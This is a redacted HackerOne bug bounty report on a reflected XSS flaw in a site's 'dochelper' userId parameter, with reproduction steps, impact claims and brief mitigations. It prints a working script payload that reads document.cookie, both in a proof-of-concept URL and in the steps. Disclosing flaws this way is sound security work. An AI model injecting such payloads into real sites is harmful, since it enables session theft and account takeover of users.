# Reflected XSS at ████████

## Metadata
- **Source:** HackerOne
- **Report:** 1834042 | https://hackerone.com/reports/1834042
- **Submitted:** 2023-01-13
- **Reporter:** ohzo
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** CVE-2016-5682
- **Category:** web-api

## Summary
The domain █████████ have dochelper where the user id is submitted.
We can submit the crafted XSS payload to pop the alert message by accesing the cookie.

POC URL: 
```
https://████/dochelper?userId=</b><script>alert(document.cookie)</script><b><!-- 
```

█████

## References
CVE-2016-5682
https://portswigger.net/web-security/cross-site-scripting
https://www.bugbountyhunter.com/vulnerability/?typ

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

The domain █████████ have dochelper where the user id is submitted.
We can submit the crafted XSS payload to pop the alert message by accesing the cookie.

POC URL: 
```
https://████/dochelper?userId=</b><script>alert(document.cookie)</script><b><!-- 
```

█████

## References
CVE-2016-5682
https://portswigger.net/web-security/cross-site-scripting
https://www.bugbountyhunter.com/vulnerability/?type=xss

## Impact

*   As an attacker, I can Steal the cookie of the User, by sending a crafted mail to them.
*   Victim's Account can be compramised
*    Impersonate or masquerade as the victim user.
*    Carry out any action that the user is able to perform.
*    Read any data that the user is able to access.
*    Capture the user's login credentials.
*    Perform virtual defacement of the web site.
*    Inject trojan functionality into the web site.

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2016-5682

## Steps to Reproduce
1. Visit https://████████/dochelper?userId=
2. Put a crafetd XSS payload to the userId parameter. (</b><script>alert(document.cookie)</script><b><!--)
3. Open the link in the browser

## Suggested Mitigation/Remediation Actions
1. Filter input on arrival
2. Encode data on output.



</details>

---
*Analysed by Claude on 2026-05-24*
